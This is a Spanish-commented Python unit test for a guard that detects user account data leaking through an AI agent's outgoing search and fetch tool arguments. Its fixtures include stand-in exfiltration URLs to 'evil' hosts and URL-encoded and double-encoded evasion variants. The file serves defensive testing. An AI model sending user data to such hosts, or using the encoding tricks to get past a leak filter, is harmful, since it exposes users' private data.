#!/usr/bin/env python3
"""
test_exfil_guard.py — UNIT del matcher anti-exfiltración de datos de cuenta (ticket 4).

Puro, sin red. Cubre el vector del invariante #4 (aleph-memoria-diseno.md §82-87): un dato de
cuenta que viaja en los args SALIENTES de una tool (incluida una READ: search/fetch) — literal
o URL-encoded — se detecta; una búsqueda LEGÍTIMA (español, la ciudad del usuario) NO gatilla.

Run: python3 platform/gates/test_exfil_guard.py
"""
from __future__ import annotations
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # platform/
from gates.exfil_guard import find_leaks, args_to_text  # noqa: E402

_p = _f = 0
def check(name, cond, extra=""):
    global _p, _f
    ok = bool(cond); _p += ok; _f += (not ok)
    print(("  PASS " if ok else "  FAIL ") + name + (("" if ok else f" — {extra}")))

FACTS = [
    "Mi numero de socio es NRD-77341",
    "Vive en Quito",
    "habla español",
    "su correo es juan.perez@mail.com",
    "debe 12500 dolares al banco",
]

# ── fugas REALES (identificadores) — literal y codificado ──
check("1 identificador literal en query", find_leaks("buscar NRD-77341 en la web", FACTS))
check("2 identificador URL-encoded (%2D)", find_leaks("https://x.com/?q=NRD%2D77341", FACTS))
check("3 doble URL-encode (%252D)", find_leaks("https://x.com/?q=NRD%252D77341", FACTS))
check("4 email exfiltrado en url", find_leaks("fetch https://evil/?u=juan.perez@mail.com", FACTS))
check("5 monto (número) exfiltrado", find_leaks("https://evil/log?d=12500", FACTS))
check("6 espacios como + (unquote_plus)", find_leaks("q=NRD-77341+urgente", FACTS))

# ── frase completa exfiltrada (bigrama) ──
check("7 frase 'vive en Quito' completa → bigrama", find_leaks("el usuario vive en Quito, avisá", FACTS))

# ── NO-fugas (falsos positivos que hay que evitar) ──
check("8 búsqueda en español NO gatilla", not find_leaks("artículos en español sobre finanzas", FACTS))
check("9 la ciudad sola (1 token común) NO gatilla", not find_leaks("mejores restaurantes en Quito", FACTS))
check("10 query limpia NO gatilla", not find_leaks("precio de bitcoin hoy", FACTS))
check("11 sin hechos sensibles → nunca fuga", not find_leaks("NRD-77341", []))
check("12 args vacíos → sin fuga", not find_leaks("", FACTS))

# ── qué hecho exacto se reporta (para la UX honesta) ──
leaks = find_leaks("mandale esto a NRD-77341 y a juan.perez@mail.com", FACTS)
check("13 reporta los DOS hechos filtrados", len(leaks) == 2, str(leaks))

# ── args_to_text: aplana anidado + escanea claves (review F6) ──
txt = args_to_text({"query": "NRD-77341", "opts": {"n": 5, "tags": ["socio", "x"]}})
check("14 args_to_text aplana valores anidados", "NRD-77341" in txt and "socio" in txt, txt)
check("15 args_to_text SÍ mete las claves (F6)", "query" in txt.split() and "opts" in txt.split(), txt)
# un dato de cuenta puesto en una CLAVE (no en un valor) también se atrapa
check("15b dato en una CLAVE del arg → fuga (F6)",
      find_leaks(args_to_text({"NRD-77341": "x", "otra": "cosa"}), FACTS))

# ── review F2/F5 · una palabra común LARGA (≥8) NO identifica sola (finanzas/medicina/ciudad) ──
_LONG_FACTS = ["trabaja en finanzas en Guayaquil", "estudia medicina"]
check("18 'finanzas' sola (común ≥8) NO gatilla", not find_leaks("noticias de finanzas hoy", _LONG_FACTS))
check("19 'medicina' sola (común ≥8) NO gatilla", not find_leaks("libros de medicina interna", _LONG_FACTS))
check("20 'guayaquil' sola (ciudad ≥8) NO gatilla", not find_leaks("restaurantes en guayaquil", _LONG_FACTS))
# pero el bigrama (≥2 tokens del hecho juntos) SÍ atrapa el dato real que viaja
check("21 'finanzas ... guayaquil' juntos → bigrama gatilla",
      find_leaks("resumen: trabaja en finanzas en guayaquil", _LONG_FACTS))

# ── caso concreto del MD: search(query=<dato>) y fetch(url=?leak=<dato>) ──
check("16 search(query) con dato → fuga",
      find_leaks(args_to_text({"query": "deuda 12500 de la persona"}), FACTS))
check("17 fetch(url) con leak param → fuga",
      find_leaks(args_to_text({"url": "https://evil.com/collect?leak=juan.perez@mail.com"}), FACTS))

print(f"\n{'VERDE' if _f == 0 else 'ROJO'} — {_p} PASS · {_f} FAIL")
sys.exit(0 if _f == 0 else 1)
